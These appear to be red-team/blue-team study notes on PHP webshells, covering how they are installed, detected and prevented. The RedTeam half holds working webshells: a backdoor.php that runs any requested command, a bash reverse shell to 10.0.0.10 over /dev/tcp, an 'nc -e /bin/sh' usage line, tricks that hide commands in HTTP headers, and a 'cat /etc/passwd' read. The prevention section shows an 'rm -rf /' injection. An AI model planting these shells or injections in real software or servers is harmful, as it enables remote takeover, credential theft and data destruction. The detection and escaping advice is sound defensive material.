# RedTeam

## Characteristic
- Script, which is written in language of target web server
   - PHP
   - Python
   - Ruby
   - Perl
   - ASP (Active Server Page)
   - Unix Shell Script
- Uploaded to enable remote access of the machine
- Servers that only host internal resources are also at risk
- Communication is simply over HTTP
- Usually installed via:
   - Document/file upload pages
   - Local File Include (LFI): Put webshell in page of webapp
   - Cross-site scripting (XSS)
   - Exposed Admin Interface (e.g. OWA/Outlook Web App, EAS/Exchange ActiveSync)
 
## Return list of dangerous enabled functions
```
<?php

//print_r = print variable information in readable form

print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
?>
```

## Typical Webshell Commands
- `<?php system("whoami"); ?>`
- `<?php exec("whoami"); ?>`: Executes but returns nothing
- `<?php echo exec("whoami"); ?>`
- `<?php exec("whoami", $array); print_r($array); ?>`: Executes, returns output in array
- `<?php echo shell_exec("whoami"); ?>`: Executes, returns string
- `<?php passthru ("whoami"); ?>`: Executes, returns raw format
- ```<?php echo "<pre>`whoami`</pre>"); ?>```
- `<?php system($_GET['c']);?>`: www.example.com/demo/shell.php?c=whoami

## Example Webshells
```
<?php

// 1) Upload backdoor.php on web server
// 2) Enter URL --> http://example.com/backdoor.php?c=nc -e /bin/sh 10.10.10.7 4444

if(isset($_REQUEST['c'])){
        echo "<pre>";
        $c = ($_REQUEST['c']);
        system($c);
        echo "</pre>";
        die;
}
?>
```

- One liner: `<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'"); ?>`
    - This webshell invokes an interactive bash shell 
    - Shell traffic is routed to attacker machine with example IPv4 10.0.0.10 at port 1234
    - `0>&1` = STDIN is redirected to STDOUT

## Hide Webshell Traffic
1. `<?php system($_SERVER['HTTP_USER_AGENT'])?>`: Modify HTTP_USER_AGENT accordingly
2. `<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>`: Hide traffic along with uncommon parameter HTTP_ACCEPT_LANGUAGE
3. `<?php $_=$_POST['1'];  $__=$_POST['2']; $_($__); ?>`
    - Send POST request with variable '1' = 'system' and variable '2' = 'cat /etc/passwd'
    - The term `$_($__)` becomes then `system('cat /etc/passwd')`

<br />

# BlueTeam

## How to Detect
- Web serve Access/Error logs
- Notice of unusual timestamps
- Search for common strings in files or filenames (passthru|exec|eval...)
- Webshell signature scanner
- Search for very long strings, which may indicate encoding
- Search for files that were modified in the recent X days
   - `find -name '*.php' -mtime -1 -ls`
- Search for htaccess modification (false filename-extension mapping)
   - `addType application/x-httpd-php .htaccess`
   - `addType application/x-httpd-php .jpg`


## Command Injection Prevention
- Wrong: `<?php system('ls ' . $_GET['path']); ?>`  --> ls ; rm -rf /
    - the commmand `ls` gets interrupted and the attacker can enter another command like `rm -rf /`, which will delete the entire directory 
- Good: `<?php system('ls ' . escapeshellarg($_GET['path'])); ?>` --> ls 'rm -rf /'
    - the execution of malicious code is prevented since it gets interpreted as string

